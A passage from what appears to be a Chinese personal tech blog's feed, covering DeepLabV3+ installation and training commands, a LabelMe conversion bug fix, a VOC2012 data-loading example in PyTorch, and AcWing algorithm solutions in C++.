pytorch<br></code></pre></td></tr></table></figure><p>如果前面显示<code>(pytorch)</code>，则说明已经成功进入环境，然后执行pytorch安装命令（最新命令可以在官网查到）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">conda install pytorch torchvision cudatoolkit=10.2 -c pytorch<br></code></pre></td></tr></table></figure><h2 id="Deeplabv3-装配"><a href="#Deeplabv3-装配" class="headerlink" title="Deeplabv3+装配"></a>Deeplabv3+装配</h2><h3 id="克隆和安装deeplabv3"><a href="#克隆和安装deeplabv3" class="headerlink" title="克隆和安装deeplabv3+"></a>克隆和安装deeplabv3+</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/VainF/DeepLabV3Plus-Pytorch.git<br></code></pre></td></tr></table></figure><p>clone成功后在其目录下执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><p>装配相关依赖</p><h2 id="数据集收集"><a href="#数据集收集" class="headerlink" title="数据集收集"></a>数据集收集</h2><p><img src="https://image.0error.net/img/2022/20220429205621.png" alt="VOC2007_JPEGImages"></p><p>这里使用经典的<code>VOC2007</code>以及<code>VOC2012</code>数据集进行处理，下载之后得到几个数据集文件在本地进行解压。</p><p>文件夹层次为VOCdevkit&#x2F;VOC2007和VOCdevkit&#x2F;VOC2012</p><p>VOC2007和VOC2012下面有若干分类后的文件夹</p><p><img src="https://image.0error.net/img/2022/20220429205644.png" alt="VOC Structure"></p><ul><li>JPEGIamges放所有的数据集图片</li><li>Annotations放所有的xml标记文件</li><li>SegmentationClass放标注的数据集掩码文件</li><li>ImageSets&#x2F;Segmentation下存放训练集、验证集、测试集划分文件<ul><li>train.txt给出了训练集图片文件列表（不含后缀）</li><li>val.txt给出了验证集图片文件的列表</li><li>trainval.txt给出了训练集和验证集图片文件的列表</li><li>test.txt给出测试集图片文件的列表</li></ul></li></ul><h2 id="权重文件放置"><a href="#权重文件放置" class="headerlink" title="权重文件放置"></a>权重文件放置</h2><p>在主目录下新建<code>weights</code>文件夹，将<code>.pth</code>标识的权重文件放入</p><h2 id="测试图片"><a href="#测试图片" class="headerlink" title="测试图片"></a>测试图片</h2><p>使用deeplabv3plus_mobilenet模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python predict.py --<span class="hljs-built_in">input</span> datasets/data/VOCdevkit/VOC2007/JPEGImages/<span class="hljs-number">000001.j</span>pg --dataset voc --model deeplabv3plus_mobilenet --ckpt weights/best_deeplabv3plus_mobilenet_voc_os16.pth --save_val_results_to test_results<br></code></pre></td></tr></table></figure><h2 id="标注工具-LabelMe安装"><a href="#标注工具-LabelMe安装" class="headerlink" title="标注工具-LabelMe安装"></a>标注工具-LabelMe安装</h2><h3 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h3><p>进入Anaconda，新建一个python版本为3.6的虚拟环境，然后进入该环境，使用pip进行安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install pyqt5<br>pip install labelme<br></code></pre></td></tr></table></figure><p>接着在该环境执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">labelme<br></code></pre></td></tr></table></figure><p><img src="https://image.0error.net/img/2022/20220429205140.png" alt="labelme"></p><p>打开软件，进行标注，标注后生成json文件，最后将数据集图像文件以及标注的json文件放置在~&#x2F;mydataset目录下</p><p><img src="https://image.0error.net/img/2022/20220429205500.png" alt="label_result"></p><h3 id="数据转换"><a href="#数据转换" class="headerlink" title="数据转换"></a>数据转换</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python labelme2voc.py roadscene_train roadscene_train/data_dataset_voc --labels labels.txt<br>python labelme2voc.py roadscene_val roadscene_val/data_dataset_voc --labels labels.txt<br></code></pre></td></tr></table></figure><h1 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h1><h2 id="训练网络"><a href="#训练网络" class="headerlink" title="训练网络"></a>训练网络</h2><h3 id="使用deeplabv3plus-mobilenet模型"><a href="#使用deeplabv3plus-mobilenet模型" class="headerlink" title="使用deeplabv3plus_mobilenet模型"></a>使用deeplabv3plus_mobilenet模型</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python main.py --model deeplabv3plus_mobilenet --enable_vis --vis_port 8097 --gpu_id 0 --year 2007 --crop_val --lr 0.01 --crop_size 513 --batch_size 4 --output_stride 16 --num_classes 6 --total_itrs 1000 --ckpt weights/best_deeplabv3plus_mobilenet_voc_os16.pth<br></code></pre></td></tr></table></figure><ul><li><code>--model</code>: 指定使用的模型</li><li><code>--enable_vis</code>: 启用visdom可视化</li><li><code>--vis_port</code>: 指定visdom使用的端口</li><li><code>--gpu_id</code>: 指定gpu的id</li><li><code>--year</code>: 指定训练数据</li><li><code>--crop_val</code>: 声明进行crop操作</li><li><code>--lr</code>: 声明learning rate（学习率）</li><li><code>--crop_size</code>: 指定crop之后的图片格式为513x513</li><li><code>-- batch_size</code>: 声明batch size</li><li><code>--output_stride</code>: 网络模型对图片进行指定倍数的下采样</li><li><code>--num_classes</code>: 设定为类别数+1</li><li><code>--total_itrs</code>: 迭代数目</li><li><code>--ckpt</code>: 预训练权重文件</li></ul><h2 id="验证网络模型"><a href="#验证网络模型" class="headerlink" title="验证网络模型"></a>验证网络模型</h2><h3 id="整体测试集"><a href="#整体测试集" class="headerlink" title="整体测试集"></a>整体测试集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python main.py --model deeplabv3plus_mobilenet --gpu_id 0 --year 2007 --crop_val --lr 0.01 --crop_size 513 --batch_size 16 --output_stride 16 --ckpt checkpoints/best_deeplabv3plus_mobilenet_voc_os16.pth --test_only --save_val_results<br></code></pre></td></tr></table></figure><p>最后结果保存在<code>result</code>文件夹下</p><h3 id="图片测试"><a href="#图片测试" class="headerlink" title="图片测试"></a>图片测试</h3><h4 id="单张图片测试"><a href="#单张图片测试" class="headerlink" title="单张图片测试"></a>单张图片测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python predict.py --input datasets/data/VOCdevkit/VOC2007/JPEGImages/img001.jpg -- dataset voc --model deeplabv3plus_mobilenet --ckpt checkpoints/best_deeplabv3plus_mobilenet_voc_os16.pth --save_val_resu lts_to test_results1 --crop_size 513<br></code></pre></td></tr></table></figure><h4 id="多张图片测试"><a href="#多张图片测试" class="headerlink" title="多张图片测试"></a>多张图片测试</h4><p>如果是jpg图片，修改<code>predict.py</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">files = glob(os.path.join(opts.<span class="hljs-built_in">input</span>, <span class="hljs-string">&#x27;**/*.png&#x27;</span>), recursive=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">files = glob(os.path.join(opts.<span class="hljs-built_in">input</span>, <span class="hljs-string">&#x27;**/*.jpg&#x27;</span>), recursive=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>然后再执行命令即可</p><h1 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h1><p><img src="https://image.0error.net/img/2022/18_overlay.png" alt="result1"></p><p><img src="https://image.0error.net/img/2022/0_overlay.png" alt="result2"></p><p><img src="https://image.0error.net/img/2022/178_overlay.png" alt="result3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DeepLearning </tag>
            
            <tag> CV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LabelMe2seg无法生成真值图片的问题解决</title>
      <link href="/2022/04/e9d03737.html"/>
      <url>/2022/04/e9d03737.html</url>
      
        <content type="html"><![CDATA[<p>最近在LabelMe标注好图片之后，使用labelme2seg无法生成真值图片，报错如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">Generating dataset from: roadscene_train\img001.json<br>Traceback (most recent call last):<br>  File &quot;labelme2voc.py&quot;, line 95, in &lt;module&gt;<br>    main()<br>  File &quot;labelme2voc.py&quot;, line 85, in main<br>    labelme.utils.lblsave(out_png_file, lbl)<br>  File &quot;...\.conda\envs\label_me\lib\site-packages\labelme\utils\_io.py&quot;, line 14, in lblsave<br>    if lbl.min() &gt;= -1 and lbl.max() &lt; 255:<br>AttributeError: &#x27;tuple&#x27; object has no attribute &#x27;min&#x27;<br></code></pre></td></tr></table></figure><p>在网上搜寻解决方案未果，遂尝试自行排查，最后发现问题出现在<code>labelme2seg.py</code>本身，是labelme更新之后的接口冲突问题，只需修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lbl= labelme.utils.shapes_to_label(<br></code></pre></td></tr></table></figure><p>这一行如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lbl, _ = labelme.utils.shapes_to_label(<br></code></pre></td></tr></table></figure><p>即可解决问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> DeepLearning </tag>
            
            <tag> bugs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DeepLearning-语义分割数据处理实例</title>
      <link href="/2022/04/9c18b3f8.html"/>
      <url>/2022/04/9c18b3f8.html</url>
      
        <content type="html"><![CDATA[<p>数据集：<a href="http://host.robots.ox.ac.uk/pascal/VOC/voc2012/">Pascal VOC2012</a>， 参考材料：<a href="https://zh.d2l.ai/">动手学深度学习</a></p><p>以下示例实现了对数据的预读取，处理等操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle<br><span class="hljs-keyword">from</span> turtle <span class="hljs-keyword">import</span> width<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br><br>voc_dir = <span class="hljs-string">&quot;./dataset/VOC2012/&quot;</span><span class="hljs-comment"># 数据读取</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_voc_images</span>(<span class="hljs-params">voc_dir, is_train=<span class="hljs-literal">True</span></span>):<br>    txt_fname = os.path.join(voc_dir, <span class="hljs-string">&#x27;ImageSets&#x27;</span>, <span class="hljs-string">&#x27;Segmentation&#x27;</span>, <span class="hljs-string">&#x27;train.txt&#x27;</span> <span class="hljs-keyword">if</span> is_train <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;val.txt&#x27;</span>)<br>    mode = torchvision.io.image.ImageReadMode.RGB<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(txt_fname, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        images = f.read().split()<br><br>    features, labels = [], []<br>    <span class="hljs-keyword">for</span> i, fname <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(images):<br>        features.append(torchvision.io.read_image(os.path.join(voc_dir, <span class="hljs-string">&#x27;JPEGImages&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;fname&#125;</span>.jpg&#x27;</span>)))<br>        labels.append(torchvision.io.read_image(os.path.join(voc_dir, <span class="hljs-string">&#x27;SegmentationClass&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;fname&#125;</span>.png&#x27;</span>), mode))<br>    <span class="hljs-keyword">return</span> features, labels<br><br>train_features, train_labels = read_voc_images(voc_dir, <span class="hljs-literal">True</span>)<br><br>VOC_COLORMAP = [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>],<br>                [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>], [<span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>], [<span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>],<br>                [<span class="hljs-number">64</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">192</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">64</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">192</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>],<br>                [<span class="hljs-number">64</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>], [<span class="hljs-number">192</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>], [<span class="hljs-number">64</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>], [<span class="hljs-number">192</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>],<br>                [<span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">128</span>, <span class="hljs-number">64</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">192</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">128</span>, <span class="hljs-number">192</span>, <span class="hljs-number">0</span>],<br>                [<span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">128</span>]]<br><br>VOC_CLASSES = [<span class="hljs-string">&#x27;background&#x27;</span>, <span class="hljs-string">&#x27;aeroplane&#x27;</span>, <span class="hljs-string">&#x27;bicycle&#x27;</span>, <span class="hljs-string">&#x27;bird&#x27;</span>, <span class="hljs-string">&#x27;boat&#x27;</span>,<br>               <span class="hljs-string">&#x27;bottle&#x27;</span>, <span class="hljs-string">&#x27;bus&#x27;</span>, <span class="hljs-string">&#x27;car&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;chair&#x27;</span>, <span class="hljs-string">&#x27;cow&#x27;</span>,<br>               <span class="hljs-string">&#x27;diningtable&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;horse&#x27;</span>, <span class="hljs-string">&#x27;motorbike&#x27;</span>, <span class="hljs-string">&#x27;person&#x27;</span>,<br>               <span class="hljs-string">&#x27;potted plant&#x27;</span>, <span class="hljs-string">&#x27;sheep&#x27;</span>, <span class="hljs-string">&#x27;sofa&#x27;</span>, <span class="hljs-string">&#x27;train&#x27;</span>, <span class="hljs-string">&#x27;tv/monitor&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">voc_colormap2label</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;构建从RGB到VOC类别索引的映射&quot;&quot;&quot;</span><br>    colormap2label = torch.zeros(<span class="hljs-number">256</span> ** <span class="hljs-number">3</span>, dtype=torch.long)<br>    <span class="hljs-keyword">for</span> i, colormap <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(VOC_COLORMAP):<br>        colormap2label[<br>            (colormap[<span class="hljs-number">0</span>] * <span class="hljs-number">256</span> + colormap[<span class="hljs-number">1</span>]) * <span class="hljs-number">256</span> + colormap[<span class="hljs-number">2</span>]] = i<br>    <span class="hljs-keyword">return</span> colormap2label<br><br><span class="hljs-comment">#@save</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">voc_label_indices</span>(<span class="hljs-params">colormap, colormap2label</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;将VOC标签中的RGB值映射到它们的类别索引&quot;&quot;&quot;</span><br>    colormap = colormap.permute(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>).numpy().astype(<span class="hljs-string">&#x27;int32&#x27;</span>)<br>    idx = ((colormap[:, :, <span class="hljs-number">0</span>] * <span class="hljs-number">256</span> + colormap[:, :, <span class="hljs-number">1</span>]) * <span class="hljs-number">256</span><br>           + colormap[:, :, <span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">return</span> colormap2label[idx]<br><br>y = voc_label_indices(train_labels[<span class="hljs-number">0</span>], voc_colormap2label())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">voc_rand_crop</span>(<span class="hljs-params">feature, labek, height, weight</span>):<br>    rect = torchvision.transforms.RandomCrop.get_params(<br>        feature, (height, width))<br>    feature = torchvision.transforms.functional.crop(feature, *rect)<br>    label = torchvision.transforms.functional.crop(label, *rect)<br>    <span class="hljs-keyword">return</span> feature, label<br><br>imgs = []<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    imgs += voc_rand_crop(train_features[<span class="hljs-number">0</span>], train_labels[<span class="hljs-number">0</span>], <span class="hljs-number">200</span>, <span class="hljs-number">300</span>)<br><br><br>imgs = [img.permute(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">for</span> img <span class="hljs-keyword">in</span> imgs]<br><span class="hljs-comment">#@save</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">VOCSegDataset</span>(torch.utils.data.Dataset):<br>    <span class="hljs-string">&quot;&quot;&quot;一个用于加载VOC数据集的自定义数据集&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, is_train, crop_size, voc_dir</span>):<br>        self.transform = torchvision.transforms.Normalize(<br>            mean=[<span class="hljs-number">0.485</span>, <span class="hljs-number">0.456</span>, <span class="hljs-number">0.406</span>], std=[<span class="hljs-number">0.229</span>, <span class="hljs-number">0.224</span>, <span class="hljs-number">0.225</span>])<br>        self.crop_size = crop_size<br>        features, labels = read_voc_images(voc_dir, is_train=is_train)<br>        self.features = [self.normalize_image(feature)<br>                         <span class="hljs-keyword">for</span> feature <span class="hljs-keyword">in</span> self.<span class="hljs-built_in">filter</span>(features)]<br>        self.labels = self.<span class="hljs-built_in">filter</span>(labels)<br>        self.colormap2label = voc_colormap2label()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read &#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(self.features)) + <span class="hljs-string">&#x27; examples&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">normalize_image</span>(<span class="hljs-params">self, img</span>):<br>        <span class="hljs-keyword">return</span> self.transform(img.<span class="hljs-built_in">float</span>() / <span class="hljs-number">255.</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">self, imgs</span>):<br>        <span class="hljs-keyword">return</span> [img <span class="hljs-keyword">for</span> img <span class="hljs-keyword">in</span> imgs <span class="hljs-keyword">if</span> (<br>            img.shape[<span class="hljs-number">1</span>] &gt;= self.crop_size[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span><br>            img.shape[<span class="hljs-number">2</span>] &gt;= self.crop_size[<span class="hljs-number">1</span>])]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        feature, label = voc_rand_crop(self.features[idx], self.labels[idx],<br>                                       *self.crop_size)<br>        <span class="hljs-keyword">return</span> (feature, voc_label_indices(label, self.colormap2label))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.features)<br><br>crop_size = (<span class="hljs-number">320</span>, <span class="hljs-number">480</span>)<br>voc_train = VOCSegDataset(<span class="hljs-literal">True</span>, crop_size, voc_dir)<br>voc_test = VOCSegDataset(<span class="hljs-literal">False</span>, crop_size, voc_dir)<br><br>batch_size = <span class="hljs-number">64</span><br>train_iter = torch.utils.data.DataLoader(voc_train, batch_size, shuffle=<span class="hljs-literal">True</span>, drop_last=<span class="hljs-literal">True</span>, num_workers=d2l.get_dataloader_workers())<br><span class="hljs-keyword">for</span> X, Y <span class="hljs-keyword">in</span> train_iter:<br>    <span class="hljs-built_in">print</span>(X.shape)<br>    <span class="hljs-built_in">print</span>(Y.shape)<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> DeepLearning </tag>
            
            <tag> 笔记 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法刷题记录-2022</title>
      <link href="/2022/04/c85935d3.html"/>
      <url>/2022/04/c85935d3.html</url>
      
        <content type="html"><![CDATA[<h1 id="4月份之前"><a href="#4月份之前" class="headerlink" title="4月份之前"></a>4月份之前</h1><h2 id="AcWing-1813-方块游戏"><a href="#AcWing-1813-方块游戏" class="headerlink" title="AcWing 1813. 方块游戏"></a><a href="https://www.acwing.com/problem/content/1815/">AcWing 1813. 方块游戏</a></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>枚举，题目说明不管哪一面向上都可以，所以就两面加起来取各个字母的最大值，最后N对字母的最大值相加就是答案</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ans</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span></span>;<br>    cin&gt;&gt;n;<br>    string s1,s2;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        cin&gt;&gt;s1&gt;&gt;s2;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">c1</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span>, <span class="hljs-title">c2</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span></span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c: s1) c1[c-<span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c: s2) c2[c-<span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">26</span>;j++)<br>            ans[j] += <span class="hljs-built_in">max</span>(c1[j], c2[j]);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++)<br>        cout&lt;&lt;ans[i]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1801-蹄子剪刀布"><a href="#AcWing-1801-蹄子剪刀布" class="headerlink" title="AcWing 1801. 蹄子剪刀布"></a><a href="https://www.acwing.com/problem/content/1791/">AcWing 1801. 蹄子剪刀布</a></h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>枚举，根据题目叙述可知，相邻两个手势之间具有胜负关系，所以我们只需要将三个手势分别编号为0,1,2（原输入编号为1-3，需要进行处理），所以可以通过<code>(x+1)%3</code>获得x的下一个相邻手势，然后用两个ans分别记录两种情况下的胜负关系，然后输出较大值即可</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-type">int</span> ans1=<span class="hljs-number">0</span>, ans2=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> x,y;<br>        cin&gt;&gt;x&gt;&gt;y;<br>        x--;<br>        y--;<br>        <span class="hljs-keyword">if</span>((x+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>==y)  ans1++;<br>        <span class="hljs-keyword">if</span>(x==(y+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>)  ans2++;<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-built_in">max</span>(ans1, ans2)&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 